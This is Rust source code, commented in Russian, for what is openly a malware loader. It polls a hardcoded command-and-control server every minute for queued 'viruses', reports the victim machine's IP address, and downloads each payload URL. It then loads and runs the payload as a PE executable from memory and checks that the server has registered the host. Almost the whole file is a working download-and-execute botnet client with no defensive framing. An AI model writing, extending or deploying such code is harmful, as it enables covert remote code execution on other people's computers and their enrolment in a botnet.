use anyhow::{Context, Result};
use maple_rs::Maple;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use tokio::time::{Duration, MissedTickBehavior, interval};

const MASTER: &str = "http://master.impostorboy.ru"; // адрес дидди
const POLL_INTERVAL: Duration = Duration::from_secs(60); // раз в минуту
const RETRY_DELAY: Duration = Duration::from_secs(5); // старт паузы рестартов poll

#[derive(Clone, Deserialize)]
struct Virus {
    id: u64,
    url: String,
    status: String,
}

#[derive(Serialize)]
struct VirusResult {
    id: u64,
    status: String,
    out: Vec<u8>,
}

#[tokio::main]
async fn main() -> Result<()> {
    let client = reqwest::Client::new();
    let mut tick = interval(POLL_INTERVAL);
    tick.set_missed_tick_behavior(MissedTickBehavior::Delay); // если poll с рестартами занял дольше минуты — не догонять

    loop {
        tick.tick().await;
        poll_with_retries(&client).await;
    }
}

// poll с рестартами: сломался — паникуем, ждём backoff и заново, пока не поедет
async fn poll_with_retries(client: &reqwest::Client) {
    let mut delay = RETRY_DELAY;

    while let Err(err) = poll(client).await {
        eprintln!("poll сломался ({err:#}); рестартую через {delay:?}");
        tokio::time::sleep(delay).await;
        // экспоненциальный backoff, но не дольше обычного интервала
        delay = (delay * 2).min(POLL_INTERVAL);
    }
}

// раз в минуту дергаем /poll; при наличии вирусов спавним запуск вируса с наименьшим id
async fn poll(client: &reqwest::Client) -> Result<()> {
    let que: Vec<Virus> = client
        .get(format!("{MASTER}/poll"))
        .send()
        .await?
        .error_for_status()?
        .json()
        .await?;

    // только ещё не принятые вирусы
    if let Some(virus) = que
        .iter()
        .filter(|virus| virus.status == "created")
        .min_by_key(|virus| virus.id)
        .cloned()
    {
        tokio::spawn(run_virus(client.clone(), virus)); // асинхронно, не тормозим следующий poll
    }

    Ok(())
}

async fn run_virus(client: reqwest::Client, virus: Virus) {
    if let Err(err) = run_virus_inner(client, &virus).await {
        eprintln!("virus {} сломался: {err}", virus.id);
    }
}

async fn run_virus_inner(client: reqwest::Client, virus: &Virus) -> Result<()> {
    // сразу присылаем статус accepted: out = наш ip, мастер кладёт ip -> id в pro
    send_accepted(&client, virus.id).await?;

    // качаем virus url и исполняем
    let virus_bytes = client
        .get(&virus.url)
        .send()
        .await?
        .error_for_status()?
        .bytes()
        .await?;

    {
        let module = Maple::load_executable_from_memory(&virus_bytes)
            .context("Не удалось загрузить PE-файл из памяти")?;

        module
            .execute_entry_point()
            .context("Не удалось выполнить точку входа PE-файл")?;
        // module не Send — дропаем здесь, до .await ниже
    }

    // исполнили — только потом ищем себя в pro
    seek_self_in_pro(&client, virus.id).await?;

    Ok(())
}

async fn send_accepted(client: &reqwest::Client, id: u64) -> Result<()> {
    client
        .post(format!("{MASTER}/virus_status"))
        .json(&VirusResult {
            id,
            status: "accepted".to_owned(),
            out: local_ip().into_bytes(),
        })
        .send()
        .await?
        .error_for_status()?;
    Ok(())
}

// ищем себя в pro (ip -> id вируса), пока мастер не запишет нас туда
async fn seek_self_in_pro(client: &reqwest::Client, id: u64) -> Result<()> {
    let me = local_ip();

    let pro: HashMap<String, u64> = client
        .get(format!("{MASTER}/pro"))
        .send()
        .await?
        .error_for_status()?
        .json()
        .await?;

    if let Some(id) = pro.get(&me) {
        println!("мы в pro: {me} -> virus {id}");
        return Ok(());
    }

    // нас не записали — перепосылаем accepted и смотрим ещё раз
    eprintln!("в pro нас нет — перепосылаю accepted");
    send_accepted(client, id).await?;

    let pro: HashMap<String, u64> = client
        .get(format!("{MASTER}/pro"))
        .send()
        .await?
        .error_for_status()?
        .json()
        .await?;

    match pro.get(&me) {
        Some(id) => println!("мы в pro: {me} -> virus {id}"),
        None => anyhow::bail!("после повторного accepted нас всё ещё нет в pro"),
    }

    Ok(())
}

// ip, с которым выходим к мастеру (UDP connect пакеты не шлёт)
fn local_ip() -> String {
    std::net::UdpSocket::bind("0.0.0.0:0")
        .and_then(|sock| sock.connect("8.8.8.8:80").map(|_| sock))
        .and_then(|sock| sock.local_addr())
        .map(|addr| addr.ip().to_string())
        .unwrap_or_else(|_| "unknown".to_owned())
}
